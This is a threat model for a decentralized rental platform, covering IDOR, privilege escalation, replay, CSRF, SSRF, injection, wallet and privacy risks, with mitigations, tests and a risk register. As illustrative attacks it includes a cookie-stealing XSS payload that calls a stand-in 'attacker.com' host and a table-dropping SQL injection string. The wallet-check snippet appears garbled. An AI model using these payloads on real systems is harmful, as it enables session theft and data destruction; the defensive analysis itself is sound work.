# Rentars Threat Model

## Executive Summary

Rentars is a decentralized P2P rental platform combining financial transactions, identity management, external wallet integration, privileged moderation, and user-generated content. This threat model identifies high-risk scenarios and their mitigations.

## Assets & Actors

### Critical Assets

| Asset | Owner | Impact if Compromised | Sensitivity |
|-------|-------|----------------------|------------|
| User accounts | Users | Booking hijacking, payment fraud, identity theft | Critical |
| Bookings & payments | Users/Platform | Financial loss, platform liability, GDPR breach | Critical |
| Stellar wallet integration | Users | Direct theft of funds held in escrow | Critical |
| Admin & moderator accounts | Platform | Unauthorized account suspension, dispute manipulation | Critical |
| Personal data (profiles, messages) | Users | Privacy breach, targeted harassment | High |
| Property listings & availability | Hosts | Competitive information, reservation manipulation | High |
| Audit logs | Platform | Loss of compliance evidence, dispute defense | High |
| User-generated reviews & ratings | Platform/Users | Platform reputation, commercial bias | Medium |

### Actors

| Actor | Intent | Capability | Examples |
|-------|--------|-----------|----------|
| Authenticated user | Normal operation | Submit bookings, upload images, message hosts | Majority of traffic |
| Malicious user | Abuse platform | IDOR, privilege escalation, botting | Could be internal or external |
| Admin/Moderator | Operational access | Suspend accounts, resolve disputes, refund payments | Trusted but monitored |
| Attacker (external) | Steal funds/data | Network access, social engineering, leaked credentials | Sophisticated; possible APT |
| Attacker (supply chain) | Backdoor access | Compromised dependency, developer machine, CI/CD | Low probability; catastrophic impact |

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│ Public internet (untrusted)                                     │
│  ├─ HTTP/HTTPS requests from users                              │
│  ├─ File uploads (malware, abuse)                               │
│  └─ External APIs (Stripe, Stellar, email)                      │
└──────────────┬──────────────────────────────────────────────────┘
               │ HTTPS + Auth validation
┌──────────────┴──────────────────────────────────────────────────┐
│ Application server (semi-trusted)                               │
│  ├─ Express middleware (CORS, CSRF, rate limits)                │
│  ├─ JWT validation (signature check)                            │
│  └─ Request parsing (JSON, multipart)                           │
└──────────────┬──────────────────────────────────────────────────┘
               │ Database queries with user_id checks
┌──────────────┴──────────────────────────────────────────────────┐
│ Supabase (trusted internal)                                     │
│  ├─ PostgreSQL database                                          │
│  ├─ Row-level security (RLS) policies                           │
│  ├─ Storage bucket access control                               │
│  └─ Audit logging                                               │
└──────────────┬──────────────────────────────────────────────────┘
               │ Administrative access
┌──────────────┴──────────────────────────────────────────────────┐
│ Stellar blockchain (public/immutable)                           │
│  ├─ All transactions are permanently public                     │
│  ├─ Wallet addresses are linked to funds                        │
│  └─ Cannot reverse/delete transactions                          │
└─────────────────────────────────────────────────────────────────┘
```

## Threat Scenarios

### 1. IDOR — Insecure Direct Object References

**Threat**: Attacker modifies user ID in requests to access/modify other users' data.

#### 1.1 Booking IDOR
- **Scenario**: Attacker changes `GET /api/v1/bookings/booking-123?user_id=victim-id`
- **Impact**: View other users' bookings, payment info, messages
- **Residual Risk**: LOW

**Mitigations**:
- Verify `req.userId` matches resource owner before returning data
- Never expose user_id in URL path; use authenticated session
- Test: `__tests__/security-idor.test.ts`

```typescript
// SECURE
const booking = await supabase
  .from('bookings')
  .select('*')
  .eq('id', bookingId)
  .eq('tenant_id', req.userId)  // ← User-specific filter
  .single();
```

#### 1.2 Profile IDOR
- **Scenario**: Attacker modifies another user's profile (name, avatar, bio)
- **Impact**: Defacement, catfishing setup
- **Residual Risk**: LOW

**Mitigations**:
- RLS policy: `SELECT/UPDATE WHERE auth.uid() = id`
- Server-side ownership check: `req.userId === profileId`

#### 1.3 Property/Image IDOR
- **Scenario**: Attacker deletes another host's images
- **Impact**: Loss of property visibility, sabotage
- **Residual Risk**: LOW

**Mitigations**:
- Property ownership verified: `WHERE owner_id = req.userId`
- Image ownership verified: `WHERE property_id IN (user's properties)`

### 2. Privilege Escalation

**Threat**: Non-admin user gains admin/moderator capabilities.

#### 2.1 JWT Role Claim Forgery
- **Scenario**: Attacker modifies `role` claim in JWT before re-signing
- **Impact**: Full admin access (suspend accounts, refund payments)
- **Residual Risk**: MEDIUM → LOW (if secrets are safe)

**Mitigations**:
- JWT signed with server-side secret (`JWT_SECRET`)
- `role` claim extracted from `auth_users` table, not trusted from token
- Signature validation: `jwt.verify(token, secret)` — **fails if tampered**
- Test: `__tests__/security-privilege-escalation.test.ts`

```typescript
// SECURE: Role fetched from database, not token
const decoded = jwt.verify(token, JWT_SECRET);
const { role } = await supabase
  .from('users')
  .select('role')
  .eq('id', decoded.userId)
  .single();
// Token's role claim is ignored
```

#### 2.2 Admin Route Without Auth
- **Scenario**: Attacker bypasses `requireAdminRole` middleware
- **Impact**: Unauthorized account suspension, dispute manipulation
- **Residual Risk**: LOW (middleware is mandatory)

**Mitigations**:
- Admin routes wrapped with `authenticate`, then `requireAdminRole`
- Dual-approval required for high-risk actions (see `adminScope.middleware.ts`)
- Audit log every admin action

#### 2.3 Moderator/Support Role Abuse
- **Scenario**: Compromised moderator account used to suspend innocent users
- **Impact**: Service disruption, targeted harassment
- **Residual Risk**: MEDIUM (depends on credential theft)

**Mitigations**:
- Audit log all moderator actions with actor_id + IP
- Alerts if moderator performs unusual actions (many suspensions in short time)
- Session revocation capability for admin

### 3. Replay Attacks

**Threat**: Attacker captures and replays HTTP requests (e.g., payment, booking).

#### 3.1 Booking Request Replay
- **Scenario**: Attacker captures `POST /api/v1/bookings` with payment details and replays it
- **Impact**: Duplicate bookings, duplicate charges
- **Residual Risk**: LOW → MEDIUM (depends on idempotency)

**Mitigations**:
- Idempotency key in request header: `Idempotency-Key`
- Server checks if idempotency key was seen before; returns cached response
- Test: Replay same booking with same idempotency key — returns same result
- Booking status check: `WHERE status = 'pending'` — prevents re-booking if already confirmed

```typescript
// SECURE: Idempotency
const cached = await getIdempotencyResult(idempotencyKey, userId);
if (cached) return cached;

const result = await createBooking(...);
await saveIdempotencyResult(idempotencyKey, userId, result);
return result;
```

#### 3.2 Payment Confirmation Replay
- **Scenario**: Attacker replays `POST /api/v1/bookings/{id}/confirm-payment`
- **Impact**: Phantom confirmations, confusion on payment status
- **Residual Risk**: LOW (status check prevents double-confirming)

**Mitigations**:
- Payment confirmed only if booking status is `pending`
- Second replay attempt: status already `confirmed` — idempotent response (200 OK, same body)

#### 3.3 CSRF / Cross-Site Request Forgery
- **Scenario**: Attacker tricks user into visiting evil.com, which submits hidden form to Rentars
- **Impact**: Unauthorized actions (book property, delete images) in user's context
- **Residual Risk**: LOW (CSRF tokens validated)

**Mitigations**:
- CSRF tokens required for all state-changing requests
- Double-submit cookie pattern (see `csrf.middleware.ts`)
- SameSite=Strict cookie flag prevents cross-site submission

### 4. SSRF — Server-Side Request Forgery

**Threat**: Attacker tricks server into making requests to internal/restricted resources.

#### 4.1 Stellar RPC SSRF
- **Scenario**: Attacker manipulates property data to include malicious Stellar address, causing server to connect to attacker-controlled host
- **Impact**: Information disclosure, lateral movement to Stellar network
- **Residual Risk**: MEDIUM (depends on network isolation)

**Mitigations**:
- Stellar addresses validated: `publicKey.isValidEd25519PublicKey()`
- Server connects only to hardcoded Stellar RPC endpoint (`env.STELLAR_RPC_URL`)
- Network isolation: outbound connections restricted to Stellar domain only
- No user input in HTTP client URLs

#### 4.2 Supabase Storage SSRF
- **Scenario**: Attacker manipulates file URL to download internal Supabase metadata
- **Impact**: Potential leakage of other users' data
- **Residual Risk**: LOW (Supabase handles auth; we don't implement client-side URL fetching)

**Mitigations**:
- File URLs are Supabase-generated signed URLs
- Attacker cannot forge signed URLs (unsigned requests fail)

### 5. SQL Injection

**Threat**: Attacker injects SQL into user input, bypassing WHERE clauses.

#### 5.1 Search Query Injection
- **Scenario**: User searches for properties with SQL: `'; DROP TABLE properties; --`
- **Impact**: Data loss, service outage
- **Residual Risk**: LOW (Supabase prevents injection)

**Mitigations**:
- Supabase PostgREST API uses parameterized queries automatically
- Zod schema validation before query: `z.string().max(100)`
- tsquery-sanitization on full-text search input
- Test: `__tests__/tsquery-sanitization.test.ts`

#### 5.2 Filter Injection in Admin Queries
- **Scenario**: Admin UI sends `?filter=role%27%3D%27admin` to list users
- **Impact**: Unauthorized data access
- **Residual Risk**: LOW (Supabase RLS + parameterization)

**Mitigations**:
- Supabase generates queries from structured input, not string concatenation
- Admin filters validated by Zod schema before query

### 6. Injection — XSS, Command Injection

**Threat**: Attacker injects malicious code into user-controlled fields.

#### 6.1 XSS via Profile Bio
- **Scenario**: User sets bio to `<img src=x onerror="fetch('//attacker.com?cookie='+document.cookie)">`
- **Impact**: Session hijacking, credential theft
- **Residual Risk**: LOW

**Mitigations**:
- Frontend sanitizes bio before display (DOMPurify)
- Backend stores raw text; frontend is responsible for rendering
- CSP header: `script-src 'self'` — prevents inline scripts
- No `eval()` or `innerHTML` in frontend; use textContent
- Test: `__tests__/security-xss.test.ts`

#### 6.2 XSS via Review Comment
- **Scenario**: Reviewer posts comment with embedded script
- **Impact**: Malware distribution via property reviews
- **Residual Risk**: LOW (same as bio)

**Mitigations**:
- Review comments sanitized on display (frontend)
- Backend stores plaintext only

#### 6.3 Command Injection (Low Risk)
- **Scenario**: Attacker somehow injects shell commands into property description
- **Impact**: RCE, full system compromise
- **Residual Risk**: VERY LOW (no shell command execution in codebase)

**Mitigations**:
- No `exec()`, `spawn()`, or shell access for user input
- Node.js only processes data; no subprocess spawning with user input

### 7. Wallet & Blockchain Risks

#### 7.1 Wallet Address Mismatch
- **Scenario**: User onboards with mainnet address (testnet); deposits testnet funds
- **Impact**: Funds locked in wrong network; user loss
- **Residual Risk**: MEDIUM (UX risk, not security)

**Mitigations**:
- Verify Stellar network at signup: `env.STELLAR_NETWORK_PASSPHRASE`
- Display network in UI (testnet vs. mainnet)
- Reject addresses from wrong network
- Documentation: "Testnet funds ≠ mainnet funds"
- Test: `__tests__/security-wallet-network-mismatch.test.ts`

```typescript
// SECURE: Network verification
const publicKey = StreetlAccount.publicKey(); // User's address
const testnetAddress = publicKey; // Derived from testnet seed
// Verify address is valid for configured network
```

#### 7.2 Wallet Private Key Exposure
- **Scenario**: User's private key is leaked to platform (via clipboard, screenshot, etc.)
- **Impact**: Direct theft of all user funds
- **Residual Risk**: MEDIUM (user behavior; not platform's fault)

**Mitigations**:
- Platform **never** stores private keys
- Users sign transactions client-side (Freighter wallet)
- Documentation: "Never share your seed phrase or private key with anyone"
- Technical control: No input field for private key on backend

#### 7.3 Escrow Address Compromise
- **Scenario**: Platform escrow address private key is compromised
- **Impact**: Theft of all user deposits
- **Residual Risk**: CRITICAL (catastrophic; mitigated by architecture)

**Mitigations**:
- Escrow address is multi-sig or smart contract controlled
- Private key held by trusted custodian (not on web server)
- Monthly fund reconciliation audit
- Insurance coverage for escrow funds

### 8. Data Breach & Privacy

#### 8.1 PII Exfiltration via API
- **Scenario**: Attacker gains database access; exfiltrates all user emails and profiles
- **Impact**: GDPR violation, marketing spam, identity theft
- **Residual Risk**: MEDIUM (depends on DB security)

**Mitigations**:
- Encryption at rest: Supabase default (AES-256)
- Encryption in transit: HTTPS only
- Database access restricted: Supabase auth + RLS
- Audit logs: All queries logged by Supabase
- Data export + deletion: Users can request export/anonymization
- Test: `__tests__/privacy-data-lifecycle.test.ts`

#### 8.2 Email Log Leakage
- **Scenario**: Error logs expose user email addresses (e.g., "Email john@example.com not found")
- **Impact**: Information disclosure, targeted phishing
- **Residual Risk**: MEDIUM (depends on log sanitization)

**Mitigations**:
- Logs sanitized: Do not log email addresses in plaintext
- Example: `"User not found"` instead of `"User john@example.com not found"`
- Logs stored securely (encrypted, access-controlled)
- Test: `__tests__/security-log-leakage.test.ts`

```typescript
// INSECURE
structuredLog({ level: 'info', message: `Booking for ${email} created` });

// SECURE
structuredLog({ 
  level: 'info', 
  message: `Booking created`,
  userId: hashedUserId, // No email in logs
});
```

#### 8.3 Blockchain Address Privacy
- **Scenario**: All users' Stellar addresses are public on blockchain; linked to identity
- **Impact**: Privacy loss; user can be tracked on-chain
- **Residual Risk**: HIGH (inherent to blockchain; user responsibility)

**Mitigations**:
- Documentation: "Your Stellar address is permanently public on the blockchain"
- Recommendation: Use separate Stellar address for each platform (privacy best practice)
- Platform exports mention this limitation (see SECURITY_DATA_LIFECYCLE.md)

### 9. Rate Limiting & DoS

#### 9.1 Brute Force Login
- **Scenario**: Attacker tries 10,000 password combinations against user account
- **Impact**: Account compromise if weak password
- **Residual Risk**: LOW

**Mitigations**:
- Rate limiter: 5 failed logins per 15 minutes per IP
- Exponential backoff: Delays increase after each failure
- Account lockout after 10 failures (requires email unlock)
- Test: `__tests__/security-rate-limiting.test.ts`

#### 9.2 API Spam / DoS
- **Scenario**: Attacker floods `/api/v1/bookings` with requests
- **Impact**: Service unavailability, resource exhaustion
- **Residual Risk**: LOW

**Mitigations**:
- Global rate limiter: 100 requests per 15 minutes per IP
- User rate limiter: 1000 requests per hour per authenticated user
- Endpoint-specific limits (e.g., uploads: 100/hour)
- Requests exceeding limit: 429 Too Many Requests
- See `middleware/rateLimiter.ts`

#### 9.3 Image Upload DoS
- **Scenario**: Attacker uploads 10,000 images to exhaust storage
- **Impact**: Storage quota exceeded, service unavailable
- **Residual Risk**: LOW

**Mitigations**:
- Per-user upload rate limit: 100 images per hour
- Per-property limit: 10 images maximum
- File size limit: 10 MB per image
- Cleanup job deletes unused images after 30 days

## Security Controls Summary

Test column lists automated tests that exist in the repository. Rows marked
**none** are residual risks with no automated coverage yet; they are tracked in the
register below.

| Threat | Control Type | Implementation | Test |
|--------|-------------|-----------------|------|
| IDOR (booking, profile, property/image, privacy records) | Access control | Ownership enforced in every query (`eq('owner_id')`, `eq('property_id')`, `eq('user_id')`) | `tests/unit/security.regression.test.ts` (cross-tenant block) |
| JWT forgery / privilege escalation | Authentication | Signature verified with `JWT_SECRET` only; fails closed if unset (`config/jwtSecret.ts`); admin gate checks role after verification | `tests/unit/security.regression.test.ts` (authenticate, admin gate) |
| Wallet replay / signature forgery | Single-use challenge | Challenge consumed atomically (`DELETE ... RETURNING`) before signature check; 256-bit random challenge; 5-minute expiry | `tests/unit/security.regression.test.ts` (wallet challenge) |
| Deletion abuse / stranded escrow | Business rule + re-verification | Password re-verified; exact confirmation phrase; 409 while bookings are open; worker re-checks before anonymising | `tests/unit/privacy.lifecycle.test.ts` |
| File upload (spoofed type, bombs, SVG, orphans) | Content validation | Magic bytes decide format; pixel budget; re-encode to WebP; no raw fallback; orphan cleanup | `tests/unit/propertyImage.upload-security.test.ts` |
| CSRF | State protection | Double-submit cookies | `src/__tests__/csrf-protection.test.ts` (vitest; not in the CI unit suite) |
| Wallet network mismatch | Client-side check | `signWithFreighter` compares wallet network before signing; server never accepts client-signed envelopes | `apps/web/src/lib/__tests__/freighter-utils.test.ts` (NETWORK_MISMATCH) |
| Rate limiting / DoS | Tiered limits | Per-IP, per-user (`createUserRateLimiter`), per-endpoint | none (residual, see register) |
| SSRF | Input validation | Storage paths derived from DB records and UUID-validated ids | none (residual, see register) |
| SQL injection | Parameterization | PostgREST query builder plus Zod validation | none (residual, see register) |
| XSS | Output encoding | Frontend sanitization, CSP header | none (residual, see register) |
| Log leakage | Data minimization | Sensitive-key lists in analytics and tracing | none (residual, see register) |
| Data breach | Encryption and access control | HTTPS, Supabase encryption at rest, RLS | Monitoring only |

The former `src/__tests__/security-regression-suite.test.ts` only asserted that two
literals differ, so it caught no regressions. It is superseded by
`tests/unit/security.regression.test.ts`.

## Unresolved Risks Register

Owners are roles, not named people. Each owner must be assigned to a named person
before the review date.

| # | Risk | Severity | Owner (role) | Mitigation status | Review date |
|---|------|----------|--------------|-------------------|-------------|
| R1 | Compromised `JWT_SECRET` enables impersonation and admin access | Critical | Platform lead | Fallback removed; rotation process to be documented | 2026-11-19 |
| R2 | Deletion does not yet anonymise reviews or message content authored by the user | High | Backend lead, with privacy/legal review | Documented in `SECURITY_DATA_LIFECYCLE.md`; not yet implemented | 2026-11-19 |
| R3 | Export payloads hold a full personal-data copy for up to 7 days in the database | High | Backend lead | Payload cleared on expiry and deletion; encryption at rest of the column not verified | 2026-11-19 |
| R4 | Wallet-only accounts (no password) cannot pass password re-verification, so they cannot delete their account | Medium | Product owner with backend lead | Fails closed (cannot delete); a re-auth method for wallet users is needed | 2026-11-19 |
| R5 | Property images are served from a public bucket with no signed or expiring URLs | Medium | Platform lead | Accepted for listing photos; revisit if private property media is added | 2026-12-19 |
| R6 | Rate limiting, SSRF, injection, XSS and log-leakage controls lack automated regression tests | High | Backend lead | Controls exist; tests not yet written | 2026-11-19 |
| R7 | Migration filename validator fails on existing duplicate prefixes, so the CI job cannot pass | Medium | Backend lead | Duplicates must not be renamed (applied migrations); validator needs an allowlist | 2026-11-19 |

## Residual Risks & Monitoring

### Critical Risks (Residual)

| Risk | Reason | Monitoring |
|------|--------|-----------|
| Compromised JWT secret | Catastrophic; enables impersonation | Rotate secrets quarterly; alert on access |
| Database breach | Exposes all PII and transactions | Regular backups, encryption at rest, access logs |
| Stellar escrow compromise | Direct fund theft | Escrow address monitoring, transaction alerts |

### Monitoring & Alerts

1. **Audit log anomalies**:
   - User suspended by 5+ different moderators (unusual pattern)
   - High-value booking followed by refund
   - Admin performing unusual actions (many deletes)

2. **Failed login threshold**: > 10 failures per user per day

3. **Rate limit abuse**: IP exceeds limit > 10 times in an hour

4. **Booking disputes spike**: > 5% of bookings disputed

5. **File upload abuse**: > 50 uploads per user per hour

6. **Blockchain mismatch**: Funds in escrow exceed known total by > 5%

## Security Testing

Regression tests that run in CI (`bun run test:unit`, which covers `tests/unit`):

```bash
cd apps/backend
bun test tests/unit/security.regression.test.ts            # forgery, replay, IDOR
bun test tests/unit/privacy.lifecycle.test.ts              # export and deletion rules
bun test tests/unit/propertyImage.upload-security.test.ts  # upload content checks
```

Mutation check: restoring the `'secret'` fallback in `auth.middleware.ts` makes the
"fails closed when JWT_SECRET is unset" test fail.

## Related Documentation

- `SECURITY_ARCHITECTURE.md` — Token transport, CORS, CSRF, cookie security
- `SECURITY_DATA_LIFECYCLE.md` — Data export, deletion, retention
- `SECURITY_FILE_UPLOAD.md` — File validation, malware scanning
